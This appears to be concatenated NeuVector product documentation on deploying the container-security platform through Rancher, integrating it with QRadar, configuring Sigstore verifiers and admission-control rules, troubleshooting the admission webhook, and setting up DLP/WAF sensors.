The default (Helm-based) NeuVector deployment will deploy NeuVector containers into the cattle-neuvector-system namespace.  Note: Only NeuVector deployments through Rancher Extensions (NeuVector) of Rancher version 2.7.0+, or Apps &amp; Marketplace of Rancher version 2.6.5+ can be managed directly (single sign on to NeuVector console) through Rancher. If adding clusters to Rancher with NeuVector already deployed, or where NeuVector has been deployed directly onto the cluster, these clusters will not be enabled for SSO integration.  NeuVector UI Extension for Rancher​  Rancher Prime customers are able to easily deploy NeuVector and the NeuVector UI Extension for Rancher. This will enable Prime users to monitor and manage certain NeuVector functions and events directly through the Rancher UI. For community users, please see the Deploy NeuVector section below to deploy from Rancher Apps and Marketplace.  The first step is to enable the Rancher Extensions capability globally if it is not already enabled. Install the NeuVector-UI-Ext from the Available list Reload the extension once installation is completed On your selected cluster, install the NeuVector application from the NeuVector tab if the NeuVector app is not already installed. This should take you to the App installation steps. For more details on this installation process, see the Deploy NeuVector section below. The NeuVector dashboard should now be shown from the NeuVector menu for that cluster. From this dashboard, a summary of the security health of the cluster can be monitored. There are interactive elements in the dashboard, such as invoking a wizard to Improve Your (Security Risk) Score, including being able to turn on automated scanning for vulnerabilities if it is not enabled.In addition, the links in the upper right of the dashboard provide convenient single sign on (SSO) links to the full NeuVector console for more detailed analysis and configuration. To uninstall the extension, go back to the Extensions pageNote: Uninstalling the NeuVector UI extension will NOT uninstall the NeuVector app from each cluster. The NeuVector menu will revert to providing an SSO link into the NeuVector console.  Deploy NeuVector​  First, find the NeuVector chart in Rancher charts, select it and review the instructions and various configuration values. (Optional) Create a project to deploy into if desired, e.g. NeuVector. Note: If you see more than one NeuVector chart, don't select the one that is for upgrading legacy NeuVector 4.x Helm chart deployments.    Deploy the NeuVector chart, first configuring appropriate values for a Rancher deployment, such as:  Container run-time, e.g. docker for RKE and containerd for RKE2, or select the K3s value if using K3s.Manager service type: change to LoadBalancer if available on public cloud deployments. If access is only desired through Rancher, any allowed value will work here. See the Important note below about changing the default admin password in NeuVector.Indicate if this cluster will be either a multi-cluster federated Primary, or remote (or select both if either option is desired).Persistent volume for configuration backups    Click 'Install' after you have reviewed and updated any chart values.  After successful NeuVector deployment, you will see a summary of the deployments, daemon sets, and cron job for NeuVector. You will also be able to see the services deployed in the Services Discovery menu on the left.    Manage NeuVector​  You will now see a NeuVector menu item in the left, and selecting that will show a NeuVector tile/button, which when clicked will take you to the NeuVector console, in a new tab.    When this Single Sign On (SSO) access method is used for the first time, a corresponding user in the NeuVector cluster is created for the Rancher user login. The same user name of the Rancher logged in user will be created in NeuVector, with a role of either admin or fedAdmin, and Identity provider as Rancher.    Note in the above screen shot, two Rancher users admin and gkosaka have been automatically created for SSO. If another user is create manually in NeuVector, the Identity provider would be listed as NeuVector, as shown below. This local user can login directly to the NeuVector console without going through Rancher.    important It is recommended to login directly to the NeuVector console as admin/admin to manually change the admin password to a strong password. This will only change the NeuVector identity provider admin user password (you may see another admin user whose identify provider is Rancher). Alternatively, include a ConfigMap as a secret in the initial deployment from Rancher (see chart values for ConfigMap settings) to set the default admin password to a strong password.  Disabling NeuVector/Rancher SSO​  To disable the ability to login to NeuVector from Rancher Manager, go to Settings -&gt; Configuration.    Rancher Legacy Deployments​  The sample file will deploy one manager and 3 controllers. It will deploy an enforcer on every node. See the bottom section for specifying dedicated manager or controller nodes using node labels. Note: It is not recommended to deploy (scale) more than one manager behind a load balancer due to potential session state issues.  note Deployment on Rancher 2.x/Kubernetes should follow the Kubernetes reference section and/or Helm based deployment.  Deploy the catalog docker-compose-dist.yml, controllers will be deployed on the labelled nodes, enforcers will be deployed on the rest of nodes. (The sample file can be modified so that enforcers are only deployed to the specified nodes.) Pick one of controllers for the manager to connect to. Modify the manager's catalog file docker-compose-manager.yml, set CTRL_SERVER_IP to the controller's IP, then deploy the manager catalog.  Here are the sample compose files.

By consolidating log events and network flow data from thousands of devices, endpoints and applications distributed throughout your network, QRadar correlates all this different information and aggregates related events into single alerts to accelerates incident analysis and remediation. QRadar SIEM is available on premises and in a cloud environment.  NeuVector is a full lifecycle container security platform which fully supports QRadar integration. This integration enables QRadar to be able to collect events, logs and incident information for container and Kubernetes environment. By using NeuVector’s DSM for QRadar, customers will be able to normalize the NeuVector security log data in QRadar, then analyze, report or remediate container security events.  IBM QRadar and NeuVector DSM​  The NeuVector DSM for integrating with IBM QRadar is published and IBM validated on the IBM X-Force / App Exchange website. It is available for download here from the App Exchange website.  It is also available for download from this site here  How to Integrate NeuVector with QRadar​  Before importing the NeuVector DSM into QRadar, we recommend you check/modify these QRadar configurations to make sure everything will work as expected:  IBM QRadar version 7.3.1 and laterConfigure QRadar “System Settings” to make sure the Syslog Payload Length is big enough for example:    Configure NeuVector to Send Syslog to QRadar​  Enable Syslog configuration in Settings -&gt; Configuration. The Server IP/URL and port should be pointing to the QRadar service IP and Port, and the default Syslog port will be 514. Use the UDP protocol and “In Json” log format. Select the log level and categories to report. In a multi-cluster NeuVector environment, to collect all clusters logs, this setting needs to be enabled in every cluster. You can configure the cluster name on this page to distinguish cluster events from each other.    Configure QRadar to Analyze NeuVector Logs​  Enable or Import the NeuVector DSM to QRadar When adding a new QRadar log source, if “NeuVector” appears in the QRadar log source type, then please ignore the log source importing instructions below and take the next step “Add and enable log sources for NeuVector”.    If the “NeuVector” log source type was not found in QRadar, please refer to QRadar user manual to install NeuVector DSM via Admin &gt; Extension Management.    Add and enable log sources for NeuVector  Now we can add a new log source for NeuVector logs:    “Log Source Identifier” should be the lead controller’s pod name. NeuVector’s lead controller’s pod name can be found in the raw log data of QRadar or from NeuVector’s management console “Assets\\Controllers” as below:    Multiple log sources should be added if there are multiple NeuVector clusters running. NeuVector log source is added and enabled:    Verify the Log Activities​  Generate some NeuVector logs, for example Network Policy Violations, Configuration change events or do some Vulnerability Scans on containers/nodes. These incident or event logs will be sent to QRadar in seconds. And the NeuVector logs should be normalized in QRadar console. It can also be verified through QRadar’s DSM editor:      Integration Summary​  With the completed integration, NeuVector security and management events can be managed through QRadar together with event data from other sources. QRadar serves as the permanent event storage for NeuVector events, while the NeuVector controller performs real-time security responses and short-term cluster storage for events. QRadar can perform advanced correlation and alerting for critical container and Kubernetes security events.

The following is an example of an admission control configuration that requires a deployment's image be signed by an appropriate key or identity.  First, configure a root of trust. This can either be a public or private root of trust, depending on the Sigstore deployment used to generate signatures. If you have deployed your own instances of Sigstore's services, select the private root of trust option.  A public root of trust does not need any additional configuration outside of giving it an easily referenced name.    A private root of trust requires the the keys and/or certificates from your privately deployed instances of Sigstore's services.    Next, for a given root of trust, configure each of the verifiers that you would like to use during admission control. There are two types of verifiers: keypair and keyless. A keypair verifier would be used when trying to verify an image signed by a user-defined private key. A keyless verifier would be used when verifying a signature generated by Sigstore's keyless pattern. More information about the Sigstore signing methods can be seen here.  To configure a keypair verifier, provide a name, and a public key corresponding to a target private key.    To configure a keyless verifier, provide the OIDC issuer and identity used during signing.    Note that after root-of-trust and verifier configuration, an image must be scanned in order to determine which verifiers the given image's signatures satisfy.  The configured verifiers that an image satisfies can be viewed in the upper right section of a given image's scan results in Assets-&gt;Registries. If an image is not signed by a verifier, it will not appear in its scan results.

Mousing over each risk gauge will provide a description of it to the right and how to improve the risk score. Also see the separate documentation section Improving Security Risk Score.    Overall Security Risk Score. This is a weighted summary of the individual risk areas summarized to the right, including Service exposure, Ingress/Egress exposure, and Vulnerability exploit risks. Click on the wrench to improve the score.Service Exposure Risk Score. This is an indicator of how many services are protected by whitelist rules and running in the Monitor or Protect mode, where risk is lowest. A high ratio of services in Discover mode means these services are not segmented or isolated by whitelist rules.Ingress/Egress Risk Score. This is a weighted summary of actual threats or network violations detected on ingress or egress (out of the cluster) connections, combined with allowed ingress/egress connections. External connections which are protected by whitelist rules have lower risk but can still be attacked by embedded network attacks. Note: A list of ingress and egress IPs can be downloaded from the Ingress/Egress details section as an Exposure Report.Vulnerability Exploit Risk Score. This is the risk of exploits of vulnerabilities in running containers. Services in Discover mode with High criticality vulnerabilities will have the highest impact on the score, as they are highest risk. If services are in Monitor or Protect but still have High vulnerabilities, they are protected by network and process rules to identify (and block) suspicious activity, so will have a lower weighting on the score. A warning will be shown if the Auto-Scan button is not enabled for automatic run-time scanning.  Some of the charts are interactive, as shown below with the green arrows.    Some of the event data shown in the dashboard have limits, as described in the Reporting section.  Application Protocols Detected This chart summarizes the application protocols detected in live connections in the cluster. The category ‘Other’ means any unrecognized HTTP protocols or raw TCP connections. You can toggle between the Application Coverage and the Application Volume levels.  Application Coverage is the number of unique pod to pod conversations detected between application services. For example if service pod A connects to service pod B using HTTP that is one unique HTTP ‘conversation’, but all connections between A and B count as one conversation.Application Volume is the network activity measured in Gbytes for all services using that protocol.  Network Activity​  This provides a graphical map of your containers and the conversations between containers. It also shows connections with other local and external resources. In Monitor and Protect modes, violations are displayed with red or yellow lines to indicate that a violation has been detected.  note If a large number of containers or services are present, the view will automatically default to a namespace view (collapsed). Double click on a namespace icon to expand it.  note This display uses a local GPU if available to speed loading times.

The data in the map may take a few seconds after network activity to be displayed.  See the explanation of the Legend icons at the bottom of this page.  Assets​  Assets displays information about Platforms, Nodes, Containers, Registries, Sigstore Verifiers (used in Admission Control rules), and System Components (NeuVector Controllers, Scanners, and Enforcers).  NeuVector includes an end-to-end vulnerability management platform which can be integrated into your automated CI/CD process. Scan registries, images, and running containers and host nodes for vulnerabilities. Results for individual registries, nodes, and containers can be found here, while combined results and advanced reporting can be found in the Security Risks menu.  NeuVector also automatically runs the Docker Bench security report and Kubernetes CIS Benchmark (if applicable) on each host and running containers.  Note that the Status of all containers is shown in Assets -&gt; Containers, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Please see the section Scanning &amp; Compliance for additional details, including how to use the Jenkins plug-in NeuVector Vulnerability Scanner.  Policy​  This displays and manages the run-time Security Policy which determines what container networking, process, and file system application behavior is ALLOWED and DENIED. Any conversations and activities which are not explicitly allowed are logged as violations by NeuVector. This is also where Admission Control rules can be created.  Please see the Security Policy section of these docs for a detailed explanation of the behavior of the rules and how to edit or create rules.  Security Risks​  This enables customizable Vulnerability and Compliance management investigation, triage, and reporting. Easily research image vulnerabilities and find out which nodes or containers contain those vulnerabilities. Advanced filtering makes reviewing scan and compliance check results and provides customized reporting.  These menu's combine results from registry (image), node, and container vulnerability scans and compliance checks to enable end-to-end vulnerability management and reporting.  Notifications​  This is where you can see the logs for Security Events, Risk Reports (e.g. Scanning) and general Events. NeuVector also supports SYSLOG for integration with tools such as SPLUNK as well as webhook notifications.  Security Events  Use the search or Advanced Filter to locate specific events. The timeline widget at the top can also be adjusted using the left and right circles to change the time window. You can also easily add rules (Security Policy) to allow or deny the detected event by selecting the Review Rule button and deploying a new rule.  NeuVector continuously monitors all containers for know attacks such as DNS, DDoS, HTTP-smuggling, tunneling etc. When an attack is detected it is logged here and blocked (if container/service is set to protect), and the packet is automatically captured. You can view the packet details, for example:  Implicit Deny Rule is Violated  Violations are connections that violate the whitelist Rules or match a blacklist Rule. Violations detailed are captured and source IPs can be investigated further.  Other security events include privilege escalations, suspicious processes, or abnormal file system activity detected on containers or hosts.  Risk Reports  Registry scanning, run-time scanning, admission control events will be shown here. Also, CIS benchmarks and compliance checks results will be shown.  Please see the Reporting section for additional details and limits of the event displays in the console.  Settings​  Settings -&gt; Users &amp; Roles​  Add other users here. Users can be assigned an Admin role, a Read-only role, or custom role. In Kubernetes, users can be assigned one or more namespaces to access. Custom roles can also be configured here for users and Groups (e.g. LDAP/AD) to be mapped to the roles. See the users section for configuration details.  Settings -&gt; Configuration​  Configure a unique cluster name, new services mode, and other settings here.  If deploying on a Rancher or OpenShift cluster, authentication can be enabled such that Rancher users or OpenShift users can log into the NeuVector console with the associated RBACs. For Rancher users, a connecting button/link from the Rancher console allows Rancher admin's to open and access the NeuVector console directly.  The New Service Mode sets which protection mode any new services (applications) previously unknown or undefined in NeuVector will by default be set to. For production environments, it is not recommended to set this to Discover.  The Network Service Policy Mode, if enabled, applies the selected policy mode globally to the network rules for all groups, and each Group’s individual policy mode will only apply to process and file rules.  The Automated Promotion of Group Modes promotes a Group’s protection Mode automatically (from Discover to Monitor to Protect) based on elapsed time and criteria.  The Auto-Deletion of Unused Groups is useful for automated 'clean-up' of the discovered (and auto-created rules for) groups which are no longer in use, especially high-churn development environments. See Policy -&gt; Groups for the list of groups in NeuVector. Removing unused Groups will clean up the Groups list and all associated rules for those groups.  The X-FORWARDED-FOR enables/disables use of these headers in enforcing NeuVector network rules. This is useful to retain the original source IP of an ingress connection so it can be used for network rules enforcement. Enable means the source IP will be retained. See below for a detailed explanation.  Multiple webhooks can be configured to be used in Response Rules for customized notifications. Webhook format choices include Slack, JSON, and key-value pairs.  A Registry Proxy can be configured if your registry scanning connection between the controller and the registry must go through a proxy.  Configure SIEM integration through SYSLOG, including types of events, port etc. You can also choose to send events to the controller pod logs instead of or in addition to syslog. Note that these events will only be sent to the lead controller pod's log (not all controller pod logs in a multi-controller deployment).  An integration with IBM Security Advisor and QRadar can be established.  Import/Export the Security Policy file. You can configure SSO for SAML and LDAP/AD here as well. See the Enterprise Integration section for configuration details. Important! Be careful when importing the configuration file. Importing will overwrite the existing settings. If you import a ‘policy only’ file, the Groups and Rules of the Policy will be overwritten. If you import a file with ‘all’ settings, then the Policy, Users, and Configurations will be overwritten. Note that the original ‘admin’ user’s password of your current Controller will also be overwritten with the original admin’s password in the imported file.  The Usage Report and Collect Log exports may be requested by your NeuVector support team.  X-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Settings -&gt; LDAP/AD, SAML, and OpenID Connect​  NeuVector supports integration with LDAP/AD, SAML, and OpenID Connect for SSO and user group mapping. See the Enterprise Integration section for configuration details.  Multiple Cluster Management​  You can manage multiple NeuVector clusters (e.g. multiple Kubernetes clusters running NeuVector on different clouds or on premise) by selecting a Master cluster, and joining remote clusters to them. Each remote cluster can also be individually managed. Security rules can be propagated to multiple clusters through use of Federated Policy settings.  My Profile​  You can increase the browser timeout setting, change your password and do other administrative profile edits.  Icon Descriptions in Legend &gt; Network Activity​  You can toggle the Legend on/off in the tools box of the Network Activity map.

These include CVE High Count, CVE Names, image labels, imageScanned, namespace, user, runAsRoot, etc. There are two possible sources of criteria evaluation, Image Scans and Deployment Yaml file scans. If a criterion requires an image scan, the scan results from Registry Scanning will be used. If the image was not scanned, the admission control rule will not be applied. If a criterion requires scanning of the deployment yaml, it will be evaluated from the Kubernetes deployment. Some criteria will use the results from either an image scan OR a deployment yaml scan.  CVE score is an example of a criterion requiring an image scan.Environment variables with secrets is an example of a criterion using the deployment yaml scan.Labels and Environment variables are examples of criteria which will use BOTH image and deployment yaml scans results (logical OR) to determine matches.    After the criterion is selected, the possible Operators will be displayed. Click the ‘+’ button to add each criterion.  Using Multiple Criteria in a Single RuleThe matching logic for multiple criteria in one admission control rule is:  For different criteria types within a single rule, apply 'and'For multiple criteria of same type (e.g. multiple namespaces, registries, images), Apply 'and' for all negative matches(&quot;not contains any&quot;, &quot;is not one of&quot;) until the first positive match;After the first positive match, apply 'or'  Example with Matching a Pod Label​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 spec: replicas: 1 template: metadata: labels: app: iperfserver   The rule to match would be:    Example with Matching Environment Variables with Secrets​  apiVersion: apps/v1 kind: Deployment metadata: name: iperfserver namespace: neuvector-1 labels: name: iperfserver spec: selector: matchLabels: name: iperfserver replicas: 1 template: metadata: labels: name: iperfserver spec: containers: - name: iperfserver image: nvlab/iperf env: - name: env1 value: AIDAJQABLZS4A3QDU576 - name: env2 valueFrom: fieldRef: fieldPath: status.podIP - name: env5 value: AIDAJQABLZS4A3QDU57E command: - iperf - -s - -p - &quot;6068&quot; nodeSelector: nvallinone: &quot;true&quot; restartPolicy: Always   The Matching rule would be:  Criteria Related to Scan Results​  The following criteria are related to the results in NeuVector Assets &gt; Registry scan page:  Image, imageScanned, cveHighCount, cveMediumCount, Image compliance violations, cveNames and others.  Before NeuVector performs the match against the Admission Control rules, NeuVector retrieves the image information (For example, 10.1.127.3:5000/neuvector/toolbox/iperf:latest) from the cluster apiserver (Please refer to Request from apiserver section below). The image is composed by registry server (https://10.1.127.3:5000), repository (neuvector/toolbox/iperf) and tag (latest).  NeuVector uses this information to match the results in NeuVector Assets -&gt; Registry scan page and collects the corresponding information such as cve name, cve high or medium count etc. Image compliance violations are considered any image which has secrets or setuid/setgid violations. If users are using the image from docker registry to create a cluster resource, normally the registry server information is empty or docker.io and currently NeuVector is using the following hard-coded registry servers to match the registry scan result instead of empty or docker.io string. Of course, if there are more other than the following supported docker registry servers defined in the registry scan page, NeuVector is unable to get the registry scan results successfully.  If users are using the built-in image such as alpine or ubuntu from the docker registry, there is a hidden organization name called library. When you look at the results for docker build-in image in NeuVector Assets &gt; Registry scan page, the repository name will be library/alpine or library/ubuntu. Currently NeuVector assumes there is only one hidden library organization name in docker registry. If there is more than one, NeuVector is unable to get the registry scan results successfully as well. The above limitation could also apply on other type of docker registry servers if any.  Creating Custom Criteria Rules​  Users can create a customized criterion to be used to allow or block deployments based on common objects found in the image yaml (scanned upon deployment). Select the object to be used, for example imagePullSecrets and the matching value, for example exists. It is also recommended to use additional criteria to further target the rule, such as namespace, PSP/PSA, CVE conditions etc.    Criteria Explanations​  Criteria with a disk icon require that the image be scanned (see registry scanning), and criteria with a file icon will scan the deployment yaml. If both icons are listed, then matching will be for either (OR). If a criterion requires an image scan, but the image is NOT scanned, that part of the rule will be ignored (ie rule is bypassed, or if deployment yaml is also listed, then only the deployment yaml will be used to match). To prevent non-scanned images from bypassing rules, see the Image Scanned criterion below.   Add customized criterion. Select the object from the drop down. All custom criteria support exists and does not exist operators. For ones that allow values, additional operators and the value can be entered. Values can be static, separated by comma’s, and include wildcards. Allow Privilege Escalation. If the container allows privilege escalations, it can be blocked by setting Deny as the action. Count of High Severity CVE. This takes the results of an image (registry) scan and matches on the number of High severity (CVSS scores of 7 or higher). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of High Severity CVE with fix. This takes the results of an image (registry) scan and matches on High severity (CVSS scores of 7 or higher), AND if there is a fix available for the CVE. Select this if only planning to block deployments of high CVEs if a fix should have been applied. Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. Count of Medium Severity CVE. This takes the results of an image (registry) scan and matches on the number of Medium severity (CVSS scores of between 4 and 6). Additional operator can be added to restrict to CVEs reported a certain number of days prior, giving time for remediation for recent CVEs. CVE names. This matches on specific CVE names (e.g. CVE-2023-23914, 2023-23914, 23914, or unique text) where multiple are separated by comma’s. CVE score. Configure both the minimum score as well as the number of CVEs matching or exceeding the minimum CVSS score. Environment variables with secrets. If the deployment yaml or image scan result contains (or does not contain) any environment variables with secrets. See the criteria for secrets matching below. Environment variables. Use this to require or exclude certain environment variables in the deployment yaml or image scan. Image. Matching on specific image names, typically combined with other criteria for the rule. Image compliance violations. Matches if the image (registry) scan results in any compliance violations. See compliance for details on compliance checks. Image without OS information. Matches if the image (registry) scan results in the inability to retrieve OS information. Image registry. Matches on specific image registry names. Typically used to restrict deployments from certain registries or require deployments only from certain approved registries. Often used with other criteria such as namespaces. Image scanned. Require that an image be scanned. Often used to make sure all images are scanned to ensure that scan based criteria such as high CVEs can be applied to deployments. Image signed. Require that an image be signed through the integration of Sigstore/Cosign. This criteria simply checks whether there is any verifier in the scan result.Image Sigstore Verifiers. Require that an image be signed by a specific Sigstore root-of-trust name, as configured in Assets -&gt; Sigstore Verifiers. Checks whether the verifiers in the scan result match the verifiers in the rule configuration.Labels. Require that one or more labels be present in the deployment yaml or image scan results. Modules. Requires or excludes certain modules (packages, libraries) from being present in the image as the result of the image (registry) scan. Mount volumes. Typically used to prevent certain volumes from being mounted. Namespace. Allow or restrict deployments for certain namespace(s). Used independently but often combined with other criteria to limit the rule matching to namespace. PSP Best Practice. Equivalent rules for PSP (note: PSP is completely removed from kubernetes 1.25+, however this NeuVector equivalent may still used in 1.25+). Includes Run as privileged, Run as root, Share host's PID namespaces, Share host's IPC namespaces, Share host's Network, Allow Privilege Escalation. Resource Limit Configuration (RLC). Requires resource limits to be configured for CPU Limit/Request, Memory Limit/Request, and can require operator to be &gt; or &lt;= a configured resource value. Run as privileged. Typically used to limit or block deployments of privileged containers. Run as root. Typically used to limit or block deployments of containers run as root.. Service Account Bound High Risk Role. Can match on multiple criteria which could respresent a high risk service account role, including listing secrets, performing any operations on workloads, modification of RBAC resources, creation of workload resources, and allowing exec into a container. Share host’s IPC namespaces. Matches on IPC namespaces. Share host’s Network. Allow or disallow deployments to share the host’s network. Share host’s PID namespaces . Matches on PID namespaces. User. Allow or disallow defined users bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. User groups. Allow or disallow defined user groups bound by kubernetes at run-time, visible in the userInfo field. Note: The yaml (upload) auditing function will not be able to check this because it is bound at run-time. Violates PSA policy.

Review Admission Control Configurations​  First, check your Kubernetes or OpenShift version. Admission control is supported in Kubernetes 1.9+ and OpenShift 3.9+. For OpenShift, make sure you have edited the master-config.yaml to add the MutatingAdmissionWebhook configuration and restarted the master api-servers.  Check the Clusterrole  kubectl get clusterrole neuvector-binding-admission -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;create&quot;, &quot;update&quot;, &quot;delete&quot;   Then check:  kubectl get clusterrole neuvector-binding-app -o json   Make sure the verbs include:   &quot;get&quot;, &quot;list&quot;, &quot;watch&quot;, &quot;update&quot;   If the above verbs are not listed, the Test button will fail.  Check the Clusterrolebinding  kubectl get clusterrolebinding neuvector-binding-admission -o json   Make sure the ServiceAccount is set properly:  &quot;subjects&quot;: [ { &quot;kind&quot;: &quot;ServiceAccount&quot;, &quot;name&quot;: &quot;default&quot;, &quot;namespace&quot;: &quot;neuvector&quot;   Check the Webhook Configuration  kubectl get ValidatingWebhookConfiguration --as system:serviceaccount:neuvector:default -o yaml &gt; nv_validation.txt   The nv_validation.txt should have similar content to:  apiVersion: v1 items: - apiVersion: admissionregistration.k8s.io/v1beta1 kind: ValidatingWebhookConfiguration metadata: creationTimestamp: &quot;2019-09-11T00:51:08Z&quot; generation: 1 name: neuvector-validating-admission-webhook resourceVersion: &quot;6859045&quot; selfLink: /apis/admissionregistration.k8s.io/v1beta1/validatingwebhookconfigurations/neuvector-validating-admission-webhook uid: 3e1793ed-d42e-11e9-ba43-000c290f9e12 webhooks: - admissionReviewVersions: - v1beta1 clientConfig: caBundle: {.........................} service: name: neuvector-svc-admission-webhook namespace: neuvector path: /v1/validate/{.........................} failurePolicy: Ignore name: neuvector-validating-admission-webhook.neuvector.svc namespaceSelector: {} rules: - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - CREATE resources: - cronjobs - daemonsets - deployments - jobs - pods - replicasets - replicationcontrollers - services - statefulsets scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - UPDATE resources: - daemonsets - deployments - replicationcontrollers - statefulsets - services scope: '*' - apiGroups: - '*' apiVersions: - v1 - v1beta1 operations: - DELETE resources: - daemonsets - deployments - services - statefulsets scope: '*' sideEffects: Unknown timeoutSeconds: 30 kind: List metadata: resourceVersion: &quot;&quot; selfLink: &quot;&quot;   If you see any content like &quot;Error from server ....&quot; or &quot;... is forbidden&quot;, it means the NV controller service account doesn't have access right for ValidatingWebhookConfiguration resource. In this case it usually means the neuvector-binding-admission clusterrole/clusterrolebinding has some issue. Deleting and recreating neuvector-binding-admission clusterrole/clusterrolebinding usually the fastest fix.  Test the Admission Control Connection Button  In the NeuVector Console in Policy -&gt; Admission Control, go to More Operations -&gt; Advanced Setting and click the &quot;Test&quot; button. NeuVector will modify service neuvector-svc-admission-webhook and see if our webhook server can receive the change notifification or if it fails.  Run  kubectl get svc neuvector-svc-admission-webhook -n neuvector -o yaml   The output should look like:  apiVersion: v1 kind: Service metadata: annotations: ................... creationTimestamp: &quot;2019-09-10T22:53:03Z&quot; labels: echo-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment tag-neuvector-svc-admission-webhook: &quot;1568163072&quot; //===&gt; from last test. could be missing if it's a fresh NV deployment name: neuvector-svc-admission-webhook namespace: neuvector ................... spec: clusterIP: 10.107.143.177 ports: - name: admission-webhook port: 443 protocol: TCP targetPort: 20443 selector: app: neuvector-controller-pod sessionAffinity: None type: ClusterIP status: loadBalancer: {}   Now click admission control's advanced setting =&gt; &quot;Test&quot; button. Wait until it shows success or failure. NeuVector will modify the service neuvector-svc-admission-webhook's tag-neuvector-svc-admission-webhook label implicitly. Wait for controller internal operation. If the NeuVector webhook server receives update request from kube-apiserver about this service change, NeuVector will modify the service neuvector-svc-admission-webhook's echo-neuvector-svc-admission-webhook label to the same value as tag-neuvector-svc-admission-webhook label.

Check if neuvector-binding-app clusterrole/clusterrolebinding are configured correctly. After the test, if the value of label tag-neuvector-svc-admission-webhook is changed but not the value of label echo-neuvector-svc-admission-webhook, it means the webhook server didn't receive the request from the kube-apiserver. The kub-apiserver's request can't reach the NeuVector webhook server. The cause of this could be network connectivity issues, firewalls blocking the request (on default port 443 in), the resolving of the wrong IP for the controller or others.

NeuVector uses a regular expression (regex) based engine to perform packet filtering functions. Extreme care should be taken when applying sensors to container traffic, as the filtering function incurs additional system overhead and can impact performance of the host.  DLP and WAF filtering are applied differently depending on the group(s) to which they are applied. In general, WAF filtering is applied to inbound and outbound connections except for internal traffic where only inbound filtering is applied. DLP filtering applies to inbound and outbound connections from a 'security domain', but not any internal connections within a security domain. See the detailed descriptions below.  Configuring DLP or WAF is a two step process:  Define and test the sensor(s), which is the set of regular expressions used to match the header, URL, or entire packet.Apply the desired sensor to a Group, in the Policy -&gt; Groups screen.  WAF Sensors​  WAF sensors represent inspection of network traffic to/from a pod/container. These sensors can be applied to any applicable group, even custom groups (e.g. namespace groups). Incoming traffic to ALL containers within the group will be inspected for WAF rule detection. In addition, any outbound (egress) connections external to the cluster will be inspected.  This means that, while this feature is named WAF, it is useful and applicable to any network traffic, not only web application traffic, and therefore provides broader protections than simple WAFs. For example, API security can be enforced on outbound connections to an external api service, allowing only GET requests and blocking POSTs.  Also note that, while similar to DLP, the inspection is for incoming traffic to EVERY pod/container within the group, while DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers).    DLP Sensors​  DLP Sensors are the patterns that are used to inspect traffic. Built in sensors such as credit card and U.S. social security have predefined regular expressions. You can add custom sensors by defining regex patterns to be used in that sensor. Note that, while similar to WAF, DLP applies inspection to incoming and outgoing traffic from the group only (i.e. the security boundary), not internal traffic in the group (e.g. not east-west within a Group's containers). WAF inspection is for incoming traffic only to EVERY pod/container within the group.    Configuring DLP and WAF sensors​  The configuration of DLP and WAF sensors is similar. Create a sensor Name and any comment, then select the sensor to Add or Edit the rules for that sensor. Key fields include:  Have/Not Have. Determines if the match requires the pattern to be found (Have) in order to take the action (e.g. Deny), or only if the pattern does not exist (Not Have) should the action be taken. It is recommended that the &quot;Not Have&quot; operator be combined in the rule with a pattern using the &quot;Have&quot; operator because a single pattern with &quot;Not Have&quot; operator will not be effective.Pattern. This is the regular expression used to determine a match. You can test your regex against sample data to ensure correct Have/Not Have results.Context. Where to look for the pattern match. Choose packet for the broadest inspection of the entire network connection, or narrow the inspection to the URL, header, or body only.    Each DLP/WAF rule supports multiple patterns (max 16 patterns are allowed per rule). Multiple patterns as well as setting the rule context can also help reduce false positives.  Example of a DLP rule with a Have/Not Have pattern: Have:  \\b3[47]\\d{2}([ -]?)(?!(\\d)\\2{5}|123456|234567|345678)\\d{6}\\1(?!(\\d)\\3{4}|12345|56789)\\d{5}\\b   This produces a false positive match for &quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998&quot;:  docker exec -ti httpclient sh / # curl -d &quot;{\\&quot;context\\&quot;: \\&quot;istio_agent_go_gc_duration_seconds_sum 22.378386247999998\\&quot;}&quot; 172.17.0.5:8080/ Hello, world!   Adding a Not Have pattern removes the false positive:  istio\\_(\\w){5}   Sensors must be applied to a Group to become effective.  Applying DLP/WAF Sensors to Container Groups​  To activate a DLP or WAF sensor, go to Policy -&gt; Groups to select the group desired. Enable DLP/WAF for the Group and add the sensor(s).  It is recommended that DLP sensors be applied to the boundary of a security zone, defined by a Group, to minimize the impact of DLP inspection. If needed, define a Custom Group that represents such a security zone. For example, if the Group selected is the reserved group 'containers', 